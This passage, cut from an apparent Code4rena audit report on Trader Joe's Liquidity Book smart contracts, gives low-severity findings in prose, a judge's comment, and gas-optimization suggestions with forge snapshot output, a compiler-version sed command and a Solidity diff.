href=\"#l-01-missing-sanity-checks-on-to-addresses-in-lbroutersol\" aria-label=\"l 01 missing sanity checks on to addresses in lbroutersol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-01] Missing sanity checks on <code>to</code> addresses in <code>LBRouter.sol</code></h2>\n<p>All the public/external functions in <code>LBRouter.sol</code> require an address <code>to</code> as a parameter to which to send either tokens, LBtokens or ETH.\nWhen tokens or LBtokens are sent the protocol should check that if the <code>to</code> address is contract then that contract should is able to manage <code>ERC20/LBTokens</code>, otherwise funds would be lost.</p>\n<h2 id=\"l-02-potential-loss-of-funds-on-tokens-with-big-supplies\" style=\"position:relative;\"><a href=\"#l-02-potential-loss-of-funds-on-tokens-with-big-supplies\" aria-label=\"l 02 potential loss of funds on tokens with big supplies permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-02] Potential loss of funds on tokens with big supplies</h2>\n<p><code>swap()</code> and <code>mint()</code> both reverts if either <code>2^112</code> or <code>2^128</code> tokens are sent to the pair. This would result in the funds being stuck and nobody being able to mint or swap. Submitting as low because the cost of attack is extremely high, but it’s good to be aware of it.</p>\n<h2 id=\"l-03-in-tokenhelpersol-the-safetransfer-function-does-not-check-for-potentially-self-destroyed-tokens\" style=\"position:relative;\"><a href=\"#l-03-in-tokenhelpersol-the-safetransfer-function-does-not-check-for-potentially-self-destroyed-tokens\" aria-label=\"l 03 in tokenhelpersol the safetransfer function does not check for potentially self destroyed tokens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-03] In <code>TokenHelper.sol</code> the <code>safeTransfer</code> function does not check for potentially self-destroyed tokens.</h2>\n<p>If a pair gets created and after a while one of the tokens gets self-destroyed (maybe because of a bug) then <code>safeTransfer</code> would still succeed. It’s probably a good idea to check if the contract still exists by checking the bytecode length.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/334\">0x0Louis (Trader Joe) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/334#issuecomment-1322827665\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Really high impact, short and sweet when adding together all findings, good job!</p>\n<p>L-01 Missing sanity checks on to addresses in LBRouter.sol</p>\n<p>L-02 Potential loss of funds on tokens with big supplies</p>\n<p>L-03 In TokenHelper.sol the safeTransfer function does not check for potentially self-destroyed tokens.</p>\n<p>Also included for judging:<br>\n<a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/309\">L-04 Excess amount returned to flashloan is not sent back</a><br>\n<a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/310\">L-05 It’s possible to pay a lower fee than expected for a flashloan</a><br>\n<a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/311\">L-06 Rebasing tokens are not compatible with the protocol</a><br></p>\n</blockquote>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this contest, 14 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/250\">report highlighted below</a> by <strong>shung</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/480\">c3phas</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/437\">0x4non</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/406\">MiloTruck</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/379\">pfapostol</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/326\">IllIllI</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/303\">TomJ</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/282\">__141345__</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/190\">m_Rassska</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/162\">ReyAdmirado</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/130\">Shishigami</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/98\">Saintcode_</a>, <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/24\">Mathieu</a>, and <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/14\">LeoS</a>.</em></p>\n<h2 id=\"g-01-owner-token-enumeration-is-an-extremely-expensive-operation-but-it-is-not-essential-to-the-protocol\" style=\"position:relative;\"><a href=\"#g-01-owner-token-enumeration-is-an-extremely-expensive-operation-but-it-is-not-essential-to-the-protocol\" aria-label=\"g 01 owner token enumeration is an extremely expensive operation but it is not essential to the protocol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-01] Owner token enumeration is an extremely expensive operation but it is not essential to the protocol</h2>\n<p><code>LBToken</code> <a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L26-L27\">enumerates token/bin IDs owned by users in a pair</a>. The enumeration is only exposed through <a href=\"https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L96-L109\">two external functions</a>, which are just for convenience for off-chain usage, and not necessary for the functionality of the protocol. Removing enumeration will save tremendous amounts of gas during essential operations of adding and removing liquidity.</p>\n<h3 id=\"impact-of-enumeration\" style=\"position:relative;\"><a href=\"#impact-of-enumeration\" aria-label=\"impact of enumeration permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact of enumeration</h3>\n<p>OpenZeppelin’s EnumerableSet roughly costs 50,000 gas when adding and removing elements from the set. Even for a small price range, adding liquidity in Liquidity Book requires minting tokens from many bins. For example, currently <a href=\"https://gadgetzan.traderjoexyz.com/poolv2/0xb6076c93701d6a07266c31066b298aec6dd65c2d/0xab231a5744c8e6c45481754928ccffffd4aa0732/1\">the testnet user interface</a> mints 31 tokens when adding liquidity in a normal distribution shape. This operation <a href=\"https://testnet.snowtrace.io/tx/0x88812398557021281e52eacf38f5064a344d4bee0290e96b37ffc2bea6102042\">roughly costs 4,000,000 gas</a>, and removal costs about half of that. Given a volatile market, we can expect users to remove and re-add liquidity pretty often. This coupled operation costs around 6,000,000 gas if you have the minimum amount of bins in a normal distribution (31 as allowed by the current UI), which will be about 0.15 AVAX (25 nAVAX base fee). That would be <code>$2.25</code> in current AVAX price (<code>$15</code>). And that would be <code>$15</code> when AVAX is <code>$100</code>, and <code>$120</code> when AVAX is <code>$100</code> and network is heavily used (200 nAVAX base fee). Given that the protocol needs <code>swap_fee_earned / gas_fee_to_move_liquidity</code> to be greater than <code>1</code> to incentivize users to chase the price to concentrate the liquidity, the mint &#x26; burn fees must be as little as possible to allow non-whales to be also able to profitably move around their liquidity. Removing the enumeration can nearly halve that cost, making the protocol enticing to more users.</p>\n<h3 id=\"non-reasons-to-enumerate\" style=\"position:relative;\"><a href=\"#non-reasons-to-enumerate\" aria-label=\"non reasons to enumerate permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[Non-]reasons to enumerate</h3>\n<p>Enumeration allows user interfaces to easily see which bins a user is in directly from the blockchain. With the absence of enumeration, Trader Joe will need to index this information either using in-house tools or using something like The Graph. Trader Joe team is already familiar with indexing through their NFT marketplace Joepegs, therefore it seems practical for them to go off-chain indexing route.</p>\n<p>Enumeration allows a decentralized way to pull the information from the blockchain. We have to admit that not enumerating would be in detriment to user interfaces that would have wanted to integrate Liquidity Book by using decentralized methods only. However, that is a very small percent of builders that hold such principles. The rest of the builders can also use off-chain indexing.</p>\n<p>There is also the end user who might want to learn which bins they are in conveniently using decentralized methods. They can still do this in decentralized manner by checking all the bins, given the bin IDs are determined by step and price and have a range of few thousand (bin step = 100) to few millions (bin step = 1). Admittedly this is not very convenient, but it is doable.</p>\n<h3 id=\"diff-to-remove-enumeration\" style=\"position:relative;\"><a href=\"#diff-to-remove-enumeration\" aria-label=\"diff to remove enumeration permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Diff to remove enumeration</h3>\n<p><em>For diff that removes the enumeration from the code and tests, see warden’s <a href=\"https://github.com/code-423n4/2022-10-traderjoe-findings/issues/250\">original submission</a>.</em></p>\n<h3 id=\"gas-savings\" style=\"position:relative;\"><a href=\"#gas-savings\" aria-label=\"gas savings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas savings</h3>\n<p>Below is the output of <code>forge snapshot --diff | tail -65</code> converted to CSV. Especially see <code>testInternalBurn</code> and <code>testInternalMint</code> functions showing greater than <code>50%</code> savings.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"csv\" data-index=\"52\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Test Function,Gas Cost Difference,Percent Difference</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testSetLBPairImplementation(),-460002,-2.742%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testConstructor(uint16,uint16,uint16,uint16,uint16,uint24,uint16,uint24),-153429,-3.014%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testGetSwapInOverflowReverts(),-67031,-9.004%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testGetSwapOutWithMultipleChoices(),-427507,-10.436%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testOracleSampleFromWith2Samples(),-67031,-12.911%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testSwapYtoXSingleBinFromGetSwapIn(),-66966,-13.118%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testSwapYtoXSingleBinFromGetSwapOut(),-67031,-13.449%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testSwapXtoYSingleBinFromGetSwapOut(),-67031,-13.450%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testSwapXtoYSingleBinFromGetSwapIn(),-67031,-13.501%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testOracleSampleFromEdgeCases(),-67009,-13.970%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testFuzzingAddLiquidity(uint256),-157150,-15.139%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testDistributionOverflowReverts(),-134018,-15.454%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testOracleSampleFromWith100Samples(),-4487757,-17.917%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testClaimFeesComplex(uint256,uint256),-247423,-18.921%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testForIdSlippageCaughtReverts(),-427485,-19.194%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testClaimProtocolFees(),-247401,-19.862%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testClaimFeesY(),-247335,-20.163%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testClaimFeesX(),-247335,-20.163%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testFeesOnTokenTransfer(),-284146,-20.361%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testSwapWithDifferentBinSteps(),-427529,-20.375%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testForAmountSlippageCaughtReverts(),-473364,-21.279%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testGetSwapInWrongAmountsReverts(),-427485,-21.326%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testFlawedCompositionFactor(),-359365,-21.362%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testGetSwapInMoreBins(),-427031,-21.706%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testInsufficientLiquidityMinted(),-359321,-21.806%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testGetSwapOutOnComplexRoute(),-427464,-22.719%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testGetSwapInOnComplexRoute(),-427507,-22.968%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testOracleSampleFromWith100SamplesNotAllInitialized(),-4484457,-22.991%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testAddLiquidityIgnored(),-428376,-23.297%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testGetSwapInWithMultipleChoices(),-427507,-23.756%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testSwapYtoXDistantBinsFromGetSwapOut(),-427421,-23.911%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testSwapYtoXDistantBinsFromGetSwapIn(),-427421,-23.933%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testBalanceOfBatch(),-256383,-24.074%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testFeeOnActiveBinReverse(),-213936,-24.331%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testFeeOnActiveBin(),-213936,-24.331%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testSwapXtoYDistantBinsFromGetSwapOut(),-427486,-24.412%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testSafeBatchTransferNotApprovedReverts(),-256343,-24.420%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testSwapXtoYDistantBinsFromGetSwapIn(),-427486,-24.425%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testSafeTransferNotApprovedReverts(),-256376,-24.488%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testFlashloan(),-427513,-24.826%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testSwapXtoYConsecutiveBinFromGetSwapOut(),-427486,-25.050%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testSwapXtoYConsecutiveBinFromGetSwapIn(),-427486,-25.064%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testSwapYtoXConsecutiveBinFromGetSwapOut(),-427486,-25.089%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testSwapYtoXConsecutiveBinFromGetSwapIn(),-427486,-25.104%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testBurnLiquidity(),-477535,-25.129%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testSafeTransferFrom(),-295891,-25.295%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testGetSwapOutOnV2Pair(),-427507,-26.931%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testGetSwapInOnV2Pair(),-427507,-26.953%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testSweepLBToken(),-489987,-27.188%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testModifierCheckLength(),-535964,-28.163%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testSafeTransferFromReverts(),-537662,-28.222%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testForceDecay(),-2319546,-28.916%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testSafeBatchTransferFromReverts(),-606907,-29.824%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testAddLiquidityTaxToken(),-1076244,-29.978%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testTLowerThanTimestamp(),-2319913,-30.143%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testRemoveLiquidityReverseOrder(),-709108,-33.958%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testAddLiquidityNoSlippage(),-709107,-33.960%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testAddLiquidityAVAXReversed(),-1608674,-35.141%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testAddLiquidityAVAX(),-1758599,-35.555%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testSafeBatchTransferFrom(),-570685,-36.100%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testRemoveLiquiditySlippageReverts(),-2670446,-42.380%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testInternalBurn(uint256,uint256),-67156,-53.633%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testInternalMint(uint256),-67231,-55.603%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">testInternalExcessiveBurnAmountReverts(uint128,uint128),-66987,-56.306%</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Overall,-39447398,-1550.248%</span></span></code></pre>\n<p>Note that there are other instances of enumeration in the protocol. However, they only cost gas in admin functions or during pair creation. Also they enumerate addresses. Therefore I believe them to be justified, hence I only focused on enumeration of this core protocol functionality (adding and removing liquidity). I think it is essential to remove this enumeration to improve the efficiency of the protocol. Reducing gas cost during adding or removing liquidity is of utmost importance for the optimization of this protocol, as it will make it feasible to do bin operations at greater scale.</p>\n<h2 id=\"g-02-using-solidity-version-0817-will-provide-an-overall-gas-optimization\" style=\"position:relative;\"><a href=\"#g-02-using-solidity-version-0817-will-provide-an-overall-gas-optimization\" aria-label=\"g 02 using solidity version 0817 will provide an overall gas optimization permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-02] Using Solidity version 0.8.17 will provide an overall gas optimization</h2>\n<p>Using at least <code>0.8.10</code> will save gas due to skipped <code>extcodesize</code> check if there is a return value. Currently the contracts are compiled using version <code>0.8.7</code> (Foundry default). It is easily changeable to <code>0.8.17</code> using the command <code>sed -i 's/0\\.8\\.7/^0.8.0/' test/*.sol &#x26;&#x26; sed -i '4isolc = \"0.8.17\"' foundry.toml</code>. This will have the following total savings obtained by <code>forge snapshot --diff | tail -1</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"csv\" data-index=\"53\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Test Function,Gas Cost Difference,Percent Difference</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Overall,-582995,-88.032%</span></span></code></pre>\n<h2 id=\"g-03-ternary-operation-is-cheaper-than-if-else-statement\" style=\"position:relative;\"><a href=\"#g-03-ternary-operation-is-cheaper-than-if-else-statement\" aria-label=\"g 03 ternary operation is cheaper than if else statement permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-03] Ternary operation is cheaper than if-else statement</h2>\n<p>There are instances where a ternary operation can be used instead of if-else statement. In these cases, using ternary operation will save modest amounts of gas.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"54\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/libraries/BitMath.sol b/src/libraries/BitMath.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index d088fdf..29c4034 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/libraries/BitMath.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/libraries/BitMath.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -16,9 +16,7 @@ library BitMath {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         uint8 _bit,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         bool _rightSide</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) internal pure returns (uint256) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (_rightSide) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            return closestBitRight(_integer, _bit - 1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        } else return closestBitLeft(_integer, _bit + 1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        return _rightSide ? closestBitRight(_integer, _bit - 1) : closestBitLeft(_integer, _bit + 1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @notice Returns the most (or least) significant bit of `_integer`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -26,9 +24,7 @@ library BitMath {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @param _isMostSignificant Whether we want the most (true) or the least (false) significant bit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     /// @return The index of the most (or least) significant bit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     function significantBit(uint256 _integer, bool _isMostSignificant) internal pure returns (uint8) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (_isMostSignificant) {</span></span></span>\n<span class=\"grvsc-line\"><span 